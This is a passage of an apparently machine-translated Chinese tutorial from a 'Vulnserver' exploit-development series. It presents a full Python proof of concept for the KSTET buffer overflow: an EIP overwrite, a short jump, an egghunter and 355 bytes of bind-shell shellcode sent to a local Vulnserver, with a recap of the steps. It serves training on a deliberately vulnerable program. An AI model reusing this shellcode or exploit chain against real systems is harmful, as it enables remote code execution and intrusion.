b">KSTET</code>命令中没有合适的地方添加外壳代码。</p><p id="fd46" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">一次巡视中，我发现它利用了另一个命令。所以我们可以使用之前<code class="fe lt lu lv lw b">vulnserver</code>系列中的<code class="fe lt lu lv lw b">GMON</code>命令漏洞利用(<a class="ae mq" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-3-24859bd31c0a" rel="noopener"> [ExpDev] Vulnserver —第3部分</a>)。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="9275" class="nt jy it bd jz od oe dn kd of og dp kh lg oh oi kl lk oj ok kp lo ol om kt on bi translated">第三阶段外壳代码(最终漏洞)</h2><p id="ef6a" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">最后，让我们看看PoC脚本。</p><pre class="ng nh ni nj gt np lw nq nr aw ns bi"><span id="decb" class="nt jy it lw b gy nu nv l nw nx"><strong class="lw iu">### </strong><a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/KSTET%20-%20EIP%20Overwrite/final_kstet.py" rel="noopener ugc nofollow" target="_blank"><strong class="lw iu">Final_kstet.py</strong></a><strong class="lw iu"> (Source by bigb0ss)</strong></span><span id="ccb7" class="nt jy it lw b gy oq nv l nw nx">import socket<br/>import struct<br/>import os<br/>import sys</span><span id="bb99" class="nt jy it lw b gy oq nv l nw nx">vuln_command = "KSTET "<br/>crash = 94<br/>offset = 70<br/>eip = struct.pack("&lt;I", 0x62501205)                 <strong class="lw iu"># JMP ESP</strong></span><span id="6743" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu"># 1st Stage (Short JMP)</strong><br/>short_jmp = "\x83\xC0\x06\xFF\xE0"</span><span id="4f57" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu"># 2nd Stage (Egghunter)</strong><br/>egghunter = ""<br/>egghunter += "\x90\x66\x81\xca\xff\x0f\x42\x52"<br/>egghunter += "\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"<br/>egghunter += "\x74\xef\xb8\x54\x30\x30\x57\x8b"<br/>egghunter += "\xfa\xaf\x75\xea\xaf\x75\xe7\xff"<br/>egghunter += "\xe7"</span><span id="ee7f" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu"># 3rd Stage (Egg + Bind Shell)</strong><br/>buf = ""<br/>buf += "GMON /"<br/>buf += "T00WT00W"                                  <strong class="lw iu"># Egg</strong><br/>buf += "\x90" * 10<br/><strong class="lw iu"># Bind Shell (355 Bytes)</strong><br/>buf += "\xda\xc8\xb8\xaa\xa0\x38\x73\xd9\x74\x24\xf4\x5a\x2b"<br/>buf += "\xc9\xb1\x53\x31\x42\x17\x83\xc2\x04\x03\xe8\xb3\xda"<br/>buf += "\x86\x10\x5b\x98\x69\xe8\x9c\xfd\xe0\x0d\xad\x3d\x96"<br/>buf += "\x46\x9e\x8d\xdc\x0a\x13\x65\xb0\xbe\xa0\x0b\x1d\xb1"<br/>buf += "\x01\xa1\x7b\xfc\x92\x9a\xb8\x9f\x10\xe1\xec\x7f\x28"<br/>buf += "\x2a\xe1\x7e\x6d\x57\x08\xd2\x26\x13\xbf\xc2\x43\x69"<br/>buf += "\x7c\x69\x1f\x7f\x04\x8e\xe8\x7e\x25\x01\x62\xd9\xe5"<br/>buf += "\xa0\xa7\x51\xac\xba\xa4\x5c\x66\x31\x1e\x2a\x79\x93"<br/>buf += "\x6e\xd3\xd6\xda\x5e\x26\x26\x1b\x58\xd9\x5d\x55\x9a"<br/>buf += "\x64\x66\xa2\xe0\xb2\xe3\x30\x42\x30\x53\x9c\x72\x95"<br/>buf += "\x02\x57\x78\x52\x40\x3f\x9d\x65\x85\x34\x99\xee\x28"<br/>buf += "\x9a\x2b\xb4\x0e\x3e\x77\x6e\x2e\x67\xdd\xc1\x4f\x77"<br/>buf += "\xbe\xbe\xf5\xfc\x53\xaa\x87\x5f\x3c\x1f\xaa\x5f\xbc"<br/>buf += "\x37\xbd\x2c\x8e\x98\x15\xba\xa2\x51\xb0\x3d\xc4\x4b"<br/>buf += "\x04\xd1\x3b\x74\x75\xf8\xff\x20\x25\x92\xd6\x48\xae"<br/>buf += "\x62\xd6\x9c\x5b\x6a\x71\x4f\x7e\x97\xc1\x3f\x3e\x37"<br/>buf += "\xaa\x55\xb1\x68\xca\x55\x1b\x01\x63\xa8\xa4\x2c\xcf"<br/>buf += "\x25\x42\x44\x3f\x60\xdc\xf0\xfd\x57\xd5\x67\xfd\xbd"<br/>buf += "\x4d\x0f\xb6\xd7\x4a\x30\x47\xf2\xfc\xa6\xcc\x11\x39"<br/>buf += "\xd7\xd2\x3f\x69\x80\x45\xb5\xf8\xe3\xf4\xca\xd0\x93"<br/>buf += "\x95\x59\xbf\x63\xd3\x41\x68\x34\xb4\xb4\x61\xd0\x28"<br/>buf += "\xee\xdb\xc6\xb0\x76\x23\x42\x6f\x4b\xaa\x4b\xe2\xf7"<br/>buf += "\x88\x5b\x3a\xf7\x94\x0f\x92\xae\x42\xf9\x54\x19\x25"<br/>buf += "\x53\x0f\xf6\xef\x33\xd6\x34\x30\x45\xd7\x10\xc6\xa9"<br/>buf += "\x66\xcd\x9f\xd6\x47\x99\x17\xaf\xb5\x39\xd7\x7a\x7e"<br/>buf += "\x59\x3a\xae\x8b\xf2\xe3\x3b\x36\x9f\x13\x96\x75\xa6"<br/>buf += "\x97\x12\x06\x5d\x87\x57\x03\x19\x0f\x84\x79\x32\xfa"<br/>buf += "\xaa\x2e\x33\x2f"<br/>buf += "\x90" * 20</span><span id="b33e" class="nt jy it lw b gy oq nv l nw nx">payload = ""<br/>payload += vuln_command<br/>payload += "\x90" * 5<br/>payload += egghunter<br/>payload += "A" * (offset - 5 - len(egghunter))<br/>payload += eip<br/>payload += short_jmp<br/>payload += "C" * (crash - len(payload))</span><span id="1058" class="nt jy it lw b gy oq nv l nw nx">print "[+] Sending buffer (Size: %d)" % len(buf)</span><span id="2e12" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu"># GMON Command</strong><br/>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>s.connect(('127.0.0.1', 9999))<br/>print(s.recv(1024))<br/>s.send(buf)<br/>s.close()</span><span id="52be" class="nt jy it lw b gy oq nv l nw nx">print "[+] Sending buffer (Size: %d)" % len(payload)</span><span id="a4f1" class="nt jy it lw b gy oq nv l nw nx"><strong class="lw iu"># KSTET Command</strong><br/>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>s.connect(('127.0.0.1', 9999))<br/>print(s.recv(1024))<br/>s.send(payload)<br/>s.close()</span></pre><p id="d379" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">一旦我们运行了<code class="fe lt lu lv lw b">final_kstet.py</code>脚本，我们就可以成功地在端口443上打开bind shell。</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi ph"><img src="../Images/aba74852befee0e82216e6f559851c39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hiH1e6ub1bI67ZEFQ1QuAg.png"/></div></div><figcaption class="nk nl gj gh gi nm nn bd b be z dk translated">成功的</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="5a27" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">结论</h1><p id="0718" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">概括一下:</p><ol class=""><li id="d23d" class="lx ly it kx b ky ml lc mm lg mr lk ms lo mt ls pi md me mf bi translated">我们模糊了vulnserver <code class="fe lt lu lv lw b">KSTET</code>命令</li><li id="3565" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pi md me mf bi translated">找到了<code class="fe lt lu lv lw b">KSTET</code>有漏洞命令的入口点</li><li id="c82a" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pi md me mf bi translated">找到控制<code class="fe lt lu lv lw b">EIP</code>覆盖的偏移量</li><li id="cce6" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pi md me mf bi translated">找到了<code class="fe lt lu lv lw b">JMP ESP</code>地址</li><li id="2b63" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pi md me mf bi translated"><strong class="kx iu">【第一阶段外壳代码】</strong>利用14字节的空间引入第一阶段外壳代码，将JMP缩短到上面带有“A”的更大空间</li><li id="21c2" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pi md me mf bi translated"><strong class="kx iu">【第二阶段外壳代码】</strong>接下来，在“A”空间内引入Egghunter，以便再次跳转到更大的空间。</li><li id="694e" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pi md me mf bi translated"><strong class="kx iu">【第三阶段外壳代码】</strong>最后，用<code class="fe lt lu lv lw b">KSTET</code>命令引入绑定/反转外壳代码。</li></ol><p id="e1c3" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">希望你也从中学到了一些东西。感谢阅读！</p><figure class="ng nh ni nj gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nz oa di ob bf oc"><div class="gh gi pj"><img src="../Images/8e53255bc989f7ddfd9b43e278bf57be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*h0uJzLIlyxnu1jHH.png"/></div></div></figure></div></div>    
</body>
</html>